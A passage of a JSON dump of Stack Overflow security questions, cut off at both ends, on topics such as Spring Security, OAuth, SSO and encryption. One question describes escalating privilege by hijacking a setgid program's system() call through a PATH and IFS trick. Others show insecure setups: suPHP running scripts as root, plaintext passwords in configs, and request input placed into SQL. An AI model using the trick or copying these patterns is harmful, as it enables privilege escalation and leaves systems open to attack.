current implementation for the WebSecurity class makes the assumption that the UserId is an int (smallint).</p>\n\n<p>I'm considering downloading the source and editing it to use long data types instead.  Does anyone know if this has already been done?</p>\n\n<p>TIA,</p>\n"},{"tags":["security","cross-browser","bookmarklet","bookmarks"],"answer_count":1,"favorite_count":5,"up_vote_count":6,"down_vote_count":0,"view_count":348,"score":6,"question_id":5464489,"title":"Bookmarklet approach","body":"<p>I am trying to write a bookmarklet that will bookmark the current page and save the link to the current page in a backend service. When I click this bookmarklet, I want this bookmarklet to show up as a small popup on the top right in browser tab (attach iframe to existing page). This popup will have options to bookmark current page. Also, there will be options search my bookmarks, tag, etc in this popup. </p>\n\n<p>So far, I have not seen any such bookmarklets (from delicioius, pinboard,etc). Although there are bookmarklets to  post links to various services,  they don't let you search, see the existing list of bookmarks within in the same popup. User is forced to go to the bookmarking site in a new tab to search, etc. </p>\n\n<p>I am wondering is there a reason why bookmarklets (popup within existing page) like this are not done? Are there any security reasons for this? Or will be be blocked by adblockers?</p>\n"},{"tags":["security","spring","session","filter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":724,"score":0,"question_id":9118793,"title":"spring security custom sessionmanagementfilter same order value error","body":"<p>I'm trying to customize the session management filter of Spring Security, but I get the error saying that my filter and the default one have the same 'order' value (although I don't have any <code>&lt;session-managent&gt;</code> in my <code>&lt;http&gt;</code> configuration and I have autoconfig=false, as Spring Security says in its documentation).</p>\n\n<p>Here's my configuration of Spring Security:</p>\n\n<pre><code>&lt;http auto-config=\"false\" use-expressions=\"true\"&gt;\n\n    &lt;custom-filter position=\"SESSION_MANAGEMENT_FILTER\" ref=\"filtroGestionSesion\" /&gt;\n\n    &lt;intercept-url pattern=\"/resources/**\" filters=\"none\"/&gt;\n    &lt;intercept-url pattern=\"/faces/javax.faces.resource/**\" filters=\"none\"/&gt;\n    &lt;intercept-url pattern=\"/faces/inicio.xhtml\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/autenticacion/login.xhtml*\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/administracion/**\" access=\"isAuthenticated()\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/barco/**\" access=\"isAuthenticated()\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/catalogo/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/error/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/faces/paginas/plantillas/**\" access=\"permitAll\"/&gt;\n    &lt;intercept-url pattern=\"/**\" access=\"denyAll\" /&gt;\n\n    &lt;form-login login-processing-url=\"/j_spring_security_check\"\n                login-page=\"/faces/paginas/autenticacion/login.xhtml\"\n                default-target-url=\"/faces/paginas/administracion/inicioAdmon.xhtml\"\n                always-use-default-target=\"true\"\n                authentication-failure-url=\"/faces/paginas/autenticacion/login.xhtml?error=authentication\" /&gt;\n\n    &lt;logout logout-url=\"/j_spring_security_logout\"\n            logout-success-url=\"/faces/inicio.xhtml\"\n            invalidate-session=\"true\" /&gt;\n&lt;/http&gt;\n\n&lt;global-method-security pre-post-annotations=\"enabled\" /&gt;\n\n&lt;authentication-manager&gt;\n    &lt;authentication-provider&gt;\n      &lt;user-service&gt;\n        &lt;user name=\"myuser\" password=\"myuser\" authorities=\"\" /&gt;\n      &lt;/user-service&gt;\n    &lt;/authentication-provider&gt;\n&lt;/authentication-manager&gt;\n\n&lt;beans:bean id=\"filtroGestionSesion\" class=\"springSecurity.FiltroGestionSesion\"&gt;\n    &lt;beans:constructor-arg ref=\"securityContextRepository\" /&gt;\n    &lt;beans:property name=\"invalidSessionUrl\" value=\"/faces/paginas/autenticacion/login.xhtml?error=timeout\" /&gt;\n&lt;/beans:bean&gt;\n\n&lt;beans:bean id=\"securityContextRepository\" class=\"org.springframework.security.web.context.HttpSessionSecurityContextRepository\" /&gt;\n</code></pre>\n\n<p>The class with my custom filter (springSecurity.FiltroGestionSesion) is a copy-paste from the one from Spring Security (org.springframework.security.web.session.SessionManagementFilter) but changing the package name, the class name and some custom code I added to the doFilter method.</p>\n\n<p>Why doesn't it work and throws the error saying both filters have the same order?</p>\n\n<p>I already disabled the default filter by removing the corresponding child element <code>&lt;session-mangement&gt;</code> from <code>&lt;http&gt;</code>, so that the position of my filter doesn't conflict with the default filter.</p>\n\n<p>Do I have to remove any element else or customize anything else?</p>\n\n<p>Any one knows how to do a custom filter works in the position of SESSION_MANAGEMENT_FILTER disabling the default one?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["spring","apache","security","spring-security","shiro"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":870,"score":1,"question_id":11500646,"title":"Spring security vs Apache Shiro","body":"<p>What I have researhed so far most of them are saying Apache Shiro is easy to use and easy to integrate with CAS (for SSO etc). Just to ask if anyone has got experienced using both of them and which one to use and why one is better than other?</p>\n"},{"tags":["android","security","aes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12893126,"title":"converting the file type to be able , use by AES algorithm","body":"<p>how to make a file(image,text,audio,video,etc) ready to use by AES algorithm for encryption? do i need to change a format of the file to be ready use by AES,and if it is how can i do that.\nthanks in advance</p>\n"},{"tags":["security","nhibernate","orm","data-access"],"answer_count":7,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":2363,"score":9,"question_id":117129,"title":"What are best practices to implement security when using NHibernate?","body":"<p>Traditionalist argue that stored procedures provide better security than if you use a Object Relational Mapping (ORM) framework such as NHibernate. </p>\n\n<p>To counter that argument what are some approaches that can be used with NHibernate to ensure that proper security is in place (for example, preventing sql injection, etc.)?</p>\n\n<p>(<em>Please provide only one approach per answer</em>)</p>\n"},{"tags":["security","list","sharepoint","sharepoint2010"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12889564,"title":"Safely return all lists in site collection that match criteria","body":"<p>I'm using the following code to get all \"Announcement\" lists in a Web Applications site collection.</p>\n\n<p>Unfortunately, sometimes the current user does not have permission to that site and the page fails with an exception, even inside the try block.</p>\n\n<p>What would be the right way to do the following safely for all users, where even an anonymous user would just get no results?</p>\n\n<pre><code>static public List&lt;SPListMeta&gt; AllSiteAnnouncementsLists()\n{\n    var returnList = new List&lt;SPListMeta&gt;();\n    foreach (SPSite oSiteCollection in SPContext.Current.Web.Site.WebApplication.Sites)\n    {\n        var collWebs = oSiteCollection.AllWebs;\n        try\n        {\n            foreach (SPWeb oWebsite in collWebs)\n            {\n                using (oWebsite)\n                {\n                    var collSiteLists = oWebsite.GetListsOfType(SPBaseType.GenericList);\n                    returnList.AddRange(from SPList oList in collSiteLists where oList.Title == \"Announcements\" select new SPListMeta(oList));\n                }\n            }\n        }\n        catch\n        {\n        }\n\n    }\n    return returnList;\n}\n</code></pre>\n"},{"tags":["android","security","client-server","sso"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12891792,"title":"Secure SSO implementation in a client-server setup","body":"<p>I am creating an Android app and want to use SSO to make it easy for users to sign in to the application using their Google or Facebook account. The app stores its data a server so the user can access it from different devices. On the server, I am planning to use the user's email to identify the user.</p>\n\n<p>On the client I know the email belongs to the user, but how can the server be sure that it's the real user and not an attacker that sends another user's mail address to the server?</p>\n\n<p>Do I have to obtain and send the access token to the server together with the email and have the server verify the email using this token or is there something else I can do?</p>\n\n<p>Since the I'm only interested in the email for logging in it would be convenient to just fetch the mail address once and remember it on the client until the user signs out of my app. However if I need to keep the access token as well I need to regularly check if it's expired and renew it if needed.</p>\n"},{"tags":["objective-c","osx","security","launchd"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12891646,"title":"How to make sure the binary submitted by SMJobSubmit is genuine?","body":"<p>I have an application on Mac which requires elevated privileges to perform certain tasks. To accomplish this, I carry a binary executable inside my App bundle and whenever the elevation is required I submit this executable to launchd using <code>SMJobSubmit()</code>. Along with this executable file, I also submit a plist file with certain arguments to the executable to tell it what all it needs to do. </p>\n\n<p>My concern is that how can I make sure that the executable run is the one that I intend to run. What if someone replaces the executable with a malicious one which if granted the root privileges could play havoc? Does launchd or SMJobSubmit provide any immunity, or do I have to validate signatures and checksums at my end? And curiously, I could not find a single discussion online regarding this problem, maybe I am missing something trivial here.</p>\n\n<p>This <a href=\"http://www.stairways.com/blog/2012-08-06-smjobsubmit\" rel=\"nofollow\">blog</a> gives a nice example of using SMJobSubmit. I have implemented on the same lines.</p>\n"},{"tags":["security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12891367,"title":"Encryption length","body":"<p>Does the encryption length of the hash encrypted influence his own security?</p>\n\n<p>I mean if i use md5() or sha() if the returned hash has 35 chars or 55 chars does will this influence in some way security of hash?</p>\n"},{"tags":["c#",".net","security","firewall"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12889411,"title":"Does the NET Framework communicate with Comodo servers?","body":"<p>I have a 3rd party .NET application that we're using internally, and every few days it communicates with one <code>ocsp.comodoca.com (178.255.83.1)</code>, a server thats run by the COMODO security services.</p>\n\n<p>Does the .NET Framework internally communicate with such servers, for strongly-signed applications or something? I'm just asking because usually we deny such communication and everything works fine. But now we need to allow it for other reasons and I'm wondering exactly what is being tracked. (usage stats?)</p>\n"},{"tags":["json","spring","security","filter","spring-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12881015,"title":"How to programatically return a json response after executing a custom filter UsernamePasswordAuthenticationFilter?","body":"<p>I'm creating a custom filter UsernamePasswordAuthenticationFilter to handle the authentication process. Basically, when the User performs login http post through the REST /login, the custom filter will execute and should respond a json format containing user details and generated token.</p>\n\n<p>My problem is where do i set to respond a json response to the client?\nI'm thinking of creating a subclass of SavedRequestAwareAuthenticationSuccessHandler and set there the json response. Is this a good idea?</p>\n\n<p>Any help will be much appreciated =)</p>\n\n<p>Thanks</p>\n"},{"tags":["android","security","voip"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12873116,"title":"How to make my own secure VOIP application on Android?","body":"<p>I want to implement my own encryption rule before the call data go into GSM network i.e. I want the call stream in the form of bits, I will implement my own encryption algo, and then send on to the network, my app on the other side(reciever's end) will recieve the data, decrypt it and make it into audio.\nI want to know is it feasible, if it is how? I mean I want to use cell phone network as in like Airtel, Vodafone etc.</p>\n\n<p>If it is not possible It will be of great help, if I can do it using internet (2G or 3G) ?</p>\n\n<p>Any guidance in this, I want just direction.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","mysql","sql","security","pdo"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12887696,"title":"safely escaping table names/column names","body":"<p>I'm using PDO in php and as such can't escape table names or column names using prepared statements. Would the following be a foolproof way to implement it myself:</p>\n\n<pre><code>$tn = str_replace('`', '', $_REQUEST['tn']);\n$column = str_replace('`', '', $_REQUEST['column']);\n$sql = \"SELECT * FROM `tn ` WHERE `column` = 23\";\nprint_r(\n    $pdo-&gt;query($sql)-&gt;fetchAll()\n);\n</code></pre>\n\n<p>Or is there still some avenue that this can be attacked?</p>\n"},{"tags":["php","security","encryption","phpmailer","smime"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12887584,"title":"S/MIME empty email's","body":"<p>As followup on <a href=\"http://stackoverflow.com/questions/12886568/phpmailer-and-s-mime\">my previous question</a>. I've implemented the changes as posted <a href=\"http://www.adam-makes-websites.com/discoveries/sending_secure_certified_s-mime_emails_via_php\" rel=\"nofollow\">here</a>.</p>\n\n<p>The email's send correctly, the subject works, but there is no body in the email.</p>\n\n<p>If i remove the $mail->sign_cert_file variables, the email sends correctly.</p>\n\n<p>What could be the issue?</p>\n"},{"tags":["spring","security","jsf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12887097,"title":"Session scoped beans are viewed in other users session","body":"<p>I am using spring 3.1 , spring security 3.1 , primefaces with jsf 2.0 .</p>\n\n<p>I have created a login page with just simple <code>username</code> and <code>password</code>, this page is linked to a session scoped bean which has a username and password.</p>\n\n<p>When say for example <code>user x</code> access the website and still not logged out, when someone else in another place view the login page, the username value which <code>user x</code> has written appears automatically in the username field.</p>\n\n<p>How can I overcome that problem?</p>\n"},{"tags":["php","security","phpmailer","digital-certificate","smime"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12886568,"title":"PHPMailer and S/MIME","body":"<p>For a school assignment we have to send secure emails coming from a bank (we are the bank). In order to secure these emails im using PHPMailer. \nPHPMailer contains a Sign($cert_filename, $key_filename, $key_pass) method that signs the email using a certificate. I'm guessing that this is making the email 'secure' and that the customer can really know it is the bank sending the email. I'm sending the emails over my own domain using SMTP.</p>\n\n<p>In order to get the certificate i've created a certificate at <a href=\"http://www.instantssl.com/ssl-certificate-products/free-email-certificate.html\" rel=\"nofollow\">this website</a>, that got installed in my browser. </p>\n\n<p>Now the question is: how do I use that certificate to sign the emails i'm sending using my PHP script and PHPMailer? I've exported the certificate from my browser (FF), which results in a .p12 file, but i think the .p12 file isn't what im looking for.</p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["security","oauth"],"answer_count":4,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":3483,"score":11,"question_id":3487991,"title":"Why Does OAuth v2 Have Both Access and Refresh Tokens?","body":"<p>Section 4.2 of the draft OAuth 2.0 protocol indicates that an authorization server can return both an access_token (which is used to authenticate one's self with a resource) as well as a refresh_token, which is used purely to create a new access_token:</p>\n\n<p><a href=\"http://tools.ietf.org/html/draft-ietf-oauth-v2-10#section-4.2\">http://tools.ietf.org/html/draft-ietf-oauth-v2-10#section-4.2</a></p>\n\n<p>Why have both? Why not just make the access_token last as long as the refresh_token and not have a refresh_token?</p>\n"},{"tags":["c","security","ifs"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12873964,"title":"C: IFS System() Vulnerability","body":"<p>For educational reasons I have to exploit an C-Code</p>\n\n<p>The Programm set the egid first, and then the vulnerability with the <code>system(\"/usr/bin/...\");</code> Command. </p>\n\n<p>So I made an 'usr' executeable in my Home-Directory and set the Path to the Home <code>PATH=$HOME:$PATH</code></p>\n\n<p>And I want to change the IFS Variable in the bash to /: <code>export IFS='/'</code></p>\n\n<p>Unfortunatelly, when i call the C-Programm: my exploit doesn't work</p>\n\n<p>Is anybody able to tell me what is wrong?</p>\n"},{"tags":["c#","asp.net","vb.net","security","encryption"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":146,"score":3,"question_id":12546652,"title":"ASP.net Encrypt Files After Upload / Decrypt To User","body":"<p>I am doing some research and development into a possible project that my potential client is discussing with me.</p>\n\n<p>I am looking at creating an asp.net 4.5 web application that will be accessed over the web and hold some pretty sensitive information. The information is going to be uploaded via the webApp and the files stored on the server for viewing / retrieval later. I want to ensure the information is securely uploaded and stored. in order to do this I will propose a EV SSL certificate is used across the application at all times and some sort of encryption applied to the files (jpeg,pdf,txt) to ensure that if someone gained access to the application at server level the files are not directly viewable without the application too, this is where I am looking for suggestions or improvements.</p>\n\n<p>My research has guided me to AES encryption on the files, again is this going to be sufficient to protect the files ? Should encryption be applied at OS level (win2008) ? Should I store the files in the database ?</p>\n\n<p>The files must be readable back to the user on the webApp and viewable in the browser.</p>\n\n<p>Should any further information be needed, please ask!</p>\n"},{"tags":["c#",".net","windows","security"],"answer_count":5,"favorite_count":6,"up_vote_count":19,"down_vote_count":0,"view_count":10363,"score":19,"question_id":1089046,"title":"In .NET/C# test if user is an administrative user","body":"<p>Is there a canonical way to test to see if a user has administrative privileges on a machine?  </p>\n\n<p>I'm going to be starting a long running process, and much later in the process' lifetime it's going to attempt some things that require admin privileges.</p>\n\n<p>I'd like to be able to test up front if the user has those rights rather than later on.</p>\n"},{"tags":["security","passwords","standards","password-protection"],"answer_count":0,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":58,"score":5,"question_id":12732356,"title":"What standards are there for mangaging high value passwords?","body":"<p>I am leading a small team at a start-up and I am facing a dilemma with high value passwords. </p>\n\n<p>I am the only one on the team who knows all the key passwords for production servers, databases ... etc. If I get run over by a bus the rest of the team has no way of getting back into all these essential services. </p>\n\n<p>What standards exist for processes around deciding who should have access to high value passwords and how is it communicated and stored? How have you dealt with this issue on previous teams / startups. </p>\n\n<p>The application we are working on stores financial data, thus my interest in \"standards\". </p>\n\n<p><em>Update</em>: To answer some of the questions in the comments: </p>\n\n<ul>\n<li>All Servers are RedHat Enterprise Linux </li>\n<li>App Server is tomcat </li>\n<li>Database is postgres</li>\n<li>Datacenter is SSA16 certified</li>\n<li>Dedicated Servers</li>\n<li>Every server has three seperate physcial networks it is part of, production traffic in one one nic, backups on another nic, and server management on another nic.</li>\n<li>High value passwords to secure Linux Server Passwords, SSL certificates, passwords for JKS files,  passwords for development infrastructure and deployment infrastructure such as sendgrid,stripe,jira,source control, ... etc. </li>\n</ul>\n\n<p><strong>UPDATE</strong>: So far the answers are all suggesting ways of solving the problem, but are there are any standards backed by some standards body about how to do this? I will keep this question open in hopes of some one being able to name specific standards.</p>\n"},{"tags":["security","sso","iam"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":11840519,"title":"Opensource IAM tool used in development","body":"<p>I am looking for an Opensource lightweight IAM to be used in development as a substitute for the real commercial IAM in production. Something with basic IAM functionalities, easy to install &amp; easily configured to inject HTTP headers like user group.\nIs OpenAM a good option? Any recommendations?</p>\n"},{"tags":["c","security","macros"],"answer_count":5,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":112,"score":5,"question_id":12882301,"title":"How is the __func__ identifier a security risk?","body":"<p>I saw in a comment that using <code>__func__</code> is a security risk. I need to understand how is that the case?</p>\n"},{"tags":["php","security","root","suphp"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1011,"score":0,"question_id":5655660,"title":"suPHP execute PHP script as root","body":"<p>I have created several websites. Now I need to perform <code>root</code> tasks. I created a webplatform and installed. <code>root</code> owns all scripts in <code>/var/private-www/</code> and they are chmodded (0777). In <code>/var/private-www/test.php</code> stands: <code>&lt;?php echo exec('whoami'); ?&gt;</code>. My <code>suPHP</code> config is this:</p>\n\n<pre><code> [global]\n;Path to logfile\nlogfile=/var/log/suphp/suphp.log\n\n;Loglevel\nloglevel=info\n\n;User Apache is running as\nwebserver_user=root\n\n;Path all scripts have to be in\ndocroot=/var/private-www\n\n;Path to chroot() to before executing script\n;chroot=/mychroot\n\n; Security options\nallow_file_group_writeable=false\nallow_file_others_writeable=false\nallow_directory_group_writeable=false\nallow_directory_others_writeable=false\n\n;Check wheter script is within DOCUMENT_ROOT\ncheck_vhost_docroot=true\n\n;Send minor error messages to browser\nerrors_to_browser=false\n\n;PATH environment variable\nenv_path=/bin:/usr/bin\n\n;Umask to set, specify in octal notation\numask=0077\n\n; Minimum UID\nmin_uid=0\n\n; Minimum GID\nmin_gid=0\n\n\n[handlers]\n;Handler for php-scripts\napplication/x-httpd-suphp=\"php:/usr/bin/php-cgi\"\n\n;Handler for CGI-scripts\nx-suphp-cgi=\"execute:!self\"\n</code></pre>\n\n<p>When I execute <code>test.php</code> in my webbrowser, it says: <code>www-data</code> :(. Not <code>root</code>... Even when I execute it in the command line. Besides, I did <code>a2enmod suphp</code> and <code>apachectl restart</code>, so I was thinking it would work. How can I fix this?</p>\n"},{"tags":["php","security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":139,"score":2,"question_id":12881374,"title":"Authentication does not work","body":"<p>I have set a secured area using http_basic . I can see the box with username and password fields but even if I put correct information I get the box again and again as if I used wrong ones.\nMy security.yml:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>security:\n    firewalls:\n        secured_area:\n            pattern:    ^/\n            anonymous: ~\n            http_basic:\n                realm: \"Secured Demo Area\"\n\naccess_control:\n    - { path: ^/fournisseur, roles: ROLE_ADMIN, requires_channel: https }\n\nproviders:\n    in_memory:\n        memory:\n            users:\n                ryan:  { password: ryanpass, roles: 'ROLE_USER' }\n                admin: { password: kitten, roles: 'ROLE_ADMIN' }\n</code></pre>\n\n<p>PS: I am using an SSL certificate overall my web site.</p>\n"},{"tags":["javascript","ios","security","uiwebview","webview"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12857875,"title":"Security restrictions when calling Javascript within a iOS UIWebView?","body":"<p>I'm researching the viability of an iOS app that will open up multiple UIWebViews in the background and log into multiple websites based on userdata data entered into the original app.\nThe main app will be driving the hidden webviews by executing Javascript to obtain(scrape) data from the pages for cost comparison and then executing actions if desired.\nThe website are using https.</p>\n\n<p>Are there any security restrictions or other problems related to this I need to be aware of? </p>\n\n<p>Thanks</p>\n\n<p>J</p>\n"},{"tags":["php","javascript","security",".htaccess","captcha"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12770875,"title":"Create a unreadable PHP page for capthca","body":"<p>I'm using the cool-captcha for my registration form. \nThis is the Captcha generated picture code which I'm using inside my codes:</p>\n\n<pre><code>&lt;img src=\"captcha.php\" id=\"captcha\" /&gt;\n</code></pre>\n\n<p>Anyone can directly go to \"captcha.php\" page and view the image. So my question is, is there anyway to disable the direct access or direct viewing of Captcha.php in browser ? I just want the Captcha.php can only be used to view inside the img source not in direct viewing by browsers. Is there anyway to do in php or htaccess file ?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","copy","drm","piracy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":179,"score":0,"question_id":2325507,"title":"Which copy protection techniques are available for digital material?","body":"<p>Suppose a website offers the following resources for premium users:</p>\n\n<ul>\n<li>PDF Files</li>\n<li>Video Files</li>\n<li>Presentations (e.g. .ppt files)</li>\n</ul>\n\n<p>Which protection techniques are available to prevent (slow down) the user to copy and re-distribute these resources?</p>\n"},{"tags":["php","wordpress","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":11232473,"title":"wordpress secure client portal","body":"<p>Basically I have a new client that is after the following functionality from her accountancy website:</p>\n\n<ul>\n<li>A client area in which here existing clients can log into. </li>\n<li>a place within the log in are where clients can access documents\nsuch as tax    returns etc.</li>\n</ul>\n\n<p>naturally this all needs to be very secure. My question is:</p>\n\n<p>Is there a Wordpress plugin that can achieve this or is their an open source php framework out there that allows me to do this. </p>\n\n<p>I could go through the process myself using php and mysql PDO but apart from encrypting the passwords i am not confident that the security i could program would be adequate. Any recommendations?</p>\n"},{"tags":["security","application","architecture"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":27,"score":0,"question_id":12811061,"title":"How to design a application security architecture across multiple technology stack","body":"<p>Due to acquisition, we have lot of modules using different technology. We are considering a way to centralize application security controls implementation. Two solutions in my mind but both seems have some flaws:\nOption1\nCreate a independent security library. The weakness is it cannot be used for different language. We will need at least provide interface for different language.</p>\n\n<p>Option2\nCreate a security service using REST API. Then, any technology can use it. But it introduce extra performance overhead.</p>\n\n<p>Do you have any experience on this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12857688,"title":"SQL Server Schema Security","body":"<p>I have a user U in a database where I want it to be able to create types and stored procs in a specified schema say UserSchema but not be able to alter schema dbo. So I created the schema and also applied the following grant statement to it:</p>\n\n<pre><code>GRANT  ALTER, Execute ON SCHEMA ::UserSchema to [U];\n</code></pre>\n\n<p>When I login as user U and I try create a type in UserSchema it fails with a permissions failure...</p>\n\n<p>Any Ideas?</p>\n"},{"tags":["security","cookies","ssl","https","facebook-javascript-sdk"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12698846,"title":"What's the best way to support Facebook login in a secure way and avoiding eavesdropping from a malicious user?","body":"<p>Facebook has done great work on preventing eavesdropping (with tools like Firesheep) by supporting https on all facebook.com pages, but does not provide similar levels of security for 3rd party sites.</p>\n\n<p>Right now it's possible to eavesdrop the traffic from a 3rd party website which is using the Facebook JS SDK and get a user's signed fbsr_APP_ID cookie which a website should use to authenticate their users.</p>\n\n<p><strong>Is there a way to set this cookie with the <em>secure</em> parameter so that it's only transmitted over HTTPS connections?</strong></p>\n\n<p>I have read both the documentation and the JavaScript SDK source code and it doesn't seem possible. <strong>So if it's not possible, which other authentication method would you suggest to avoid eavesdropping of this cookie?</strong></p>\n"},{"tags":["security","java-ee","servlets"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12876065,"title":"OpenID in JEE6 application - how to get Principal object for user","body":"<p>I'm playing with OpenID authentication in my app for the first time. \nI can successfully authenticate user against choosen provider, but I don't know how to correctly login user on JEE server, so that it looks like user was logged in with e.g. form-based login. I could use Servlet 3.0 <code>login</code> but it takes username/password pair and I don't have passwords when using OpenID. </p>\n\n<p>I'd like to be able to get <code>Principal</code> object and use <code>isUserInRole</code> method etc. Am I missing something? I'm running this app on JBoss 7.1, but I suppose there should be a common way to do that. Or maybe I'm missing something and all that stuff with <code>Principal</code> and user roles is done differently when using OpenID?</p>\n"},{"tags":["flex","security","crossdomain.xml"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":19702,"score":4,"question_id":101427,"title":"Flex and crossdomain.xml","body":"<p>I was wondering are there any security concerns with adding crossdomain.xml to the root of an application server? Can it be added to any other parts of the server and are you aware of any work arounds that dont require the server to have this file in place?</p>\n\n<p>Thanks\nDamien</p>\n"},{"tags":["php","security","url","parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12873996,"title":"How to improve security with text in a url parameter : .php?parameter=text","body":"<p>This url contains a parameter with text :</p>\n\n<blockquote>\n  <p>my-page.php ?id_article=1&amp;alias=article-name</p>\n</blockquote>\n\n<p>The result after rewritting is :</p>\n\n<blockquote>\n  <p>1-article-name.php</p>\n</blockquote>\n\n<p>For id_article parameter, i made this security :</p>\n\n<pre><code>if (isset($_GET[id_article] &amp;&amp; $_GET[article] != null &amp;&amp; $_GET[id_article] &gt;= 1 &amp;&amp; $_GET[id_article] &lt;= 4 &amp;&amp; (int) $_GET[id_article])\n</code></pre>\n\n<p>What can i do for alias parameter which accept text ?</p>\n"},{"tags":["mysql","sql","security","phpmyadmin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12873362,"title":"Error in updating mysql database","body":"<pre><code>UPDATE \n  `code_library_questions` \nSET \n  `answer` = 'value' \nWHERE \n  `sn` = 2;\n</code></pre>\n\n<p>Its working fine when value is some text. But whenever value include some codes of C or C++, it gives following error message </p>\n\n<blockquote>\n  <p>You don't have permission to access /phpmyadmin/tbl_replace.php on this server.</p>\n</blockquote>\n\n<p>why it is happening???</p>\n"},{"tags":["web-services","security","internet-explorer"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4595,"score":7,"question_id":1890565,"title":"How to suppress \"This page is accessing information not under its control\"","body":"<p>I get this message when I am trying to access a web service from Jquery located in SAME the URL (but different directory). </p>\n\n<p>I know it is IE security setting. The question is, how do I suppress it...surely, people don't put web services in the same web site, same directory....</p>\n"},{"tags":["security","https","game-engine","cocos2d-x"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12872772,"title":"HTTPS on Cocos2d-x","body":"<p>I'm implementing a game app based on cocos2d-x. In order to technically prevent cheating, one of the ideas to do is using HTTPS for all the client-server communication, which make it difficult to get the data format / game logic and send modified request to cheat. (I know \"prevent\" is actually impossible but for increasing the cost of making game cheating it's ok : ). My question is,</p>\n\n<ol>\n<li>In Cocos2d-x, how to make HTTPS request? Possible?</li>\n<li>In a more general case, technically what to do to reduce such game hacking? What strategy to hold? </li>\n</ol>\n"},{"tags":["facebook","security","blocking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":49,"score":-5,"question_id":12872669,"title":"Android : Block Facebook Apps & iWebsite","body":"<p>I want block Facebook website &amp; its App in My Android Tablet,</p>\n\n<p>So Any Software or Setting is there?</p>\n"},{"tags":["facebook","security","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12857337,"title":"Is fb_ca_chain_bundle.crt dangerous","body":"<p>I am using Facebook PHP API and I need to have the file fb_ca_chain_bundle.crt on my server. Is it dangerous if this file is visible from the web and what can someone do with it if he finds it (supopsing he does not have the API secret)?</p>\n\n<p>I can't edit the .htaccess file, so my only option is to hide the facebook library somewhere in the directory tree.</p>\n"},{"tags":["php","security","function","md5"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":86,"score":3,"question_id":12870468,"title":"Using this custom hashing function, is there any obvious security flaws I am missing?","body":"<pre><code>&lt;?php\nfunction md7($text, $len)\n{\n  if($text)\n  {\n   $split = 